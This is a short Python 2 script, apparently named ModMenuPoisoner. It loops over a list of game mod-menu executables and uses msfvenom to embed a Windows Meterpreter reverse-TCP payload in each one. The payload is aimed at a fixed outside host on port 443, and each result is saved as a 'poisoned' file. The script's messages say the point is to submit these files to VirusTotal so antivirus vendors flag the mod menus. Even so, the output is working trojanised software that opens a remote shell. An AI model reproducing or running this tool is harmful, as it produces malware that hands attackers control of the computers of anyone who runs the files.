#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
# from termcolor import colored
import sys
import StringIO
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

payload_Generate = 'windows/meterpreter/reverse_tcp'
LHOST = '8.8.8.8'
LPORT = '443'
# input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
bad_Bytes = 'x00'
# payload_Encoder = 'x86/shikata_ga_nai'
# payload_Iterations = '1'
output_Format = 'exe'
output_Dir = '/root/Documents/ModMenusReencoded/'

wordlist_input = str(raw_input("Enter a wordlist file of mod menu filepaths, example.exe, once per line: "))
wordlist = open(wordlist_input, 'r')

# opens wordlist asnd reads each line into a variable
read_wordlist = wordlist.read()

# records line into a buffer using StringIO
buf = StringIO.StringIO(read_wordlist)

#while loop for each line

while True:
    line = buf.readline().strip()
    if line != "":
        # run the encoder against the filename
        print 'Now reencoding file: ' + line
        input_Mod_Menu = line
        basename_mod_menu = os.path.basename(input_Mod_Menu)
        reencoded_name = basename_mod_menu
        reencoded_File = output_Dir + reencoded_name
        cmd_String = "msfvenom -p {0} LHOST={1} LPORT={2} -x {3} -f {4} -o {5}".format(
            payload_Generate,
            LHOST,
            LPORT,
            input_Mod_Menu,
            output_Format,
            reencoded_File
        )
        print 'Now running command: ' + cmd_String
        os.system(cmd_String)
        print 'Poisoned Mod Menu file generated, please see: ' + reencoded_File + ' to submit it to VirusTotal!'
        print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'

    else:
        print 'Reached end of line of your wordlist'
        #print 'Please check: ' + output_Dir ' for your altered mod menu results'
        print 'Please check: ' + output_Dir + ' for your altered mod menu executables'
        print 'ENDING PROGRAM'
        os.system('python /root/ModMenuPoisoner/ModMenuPoisoner.py')
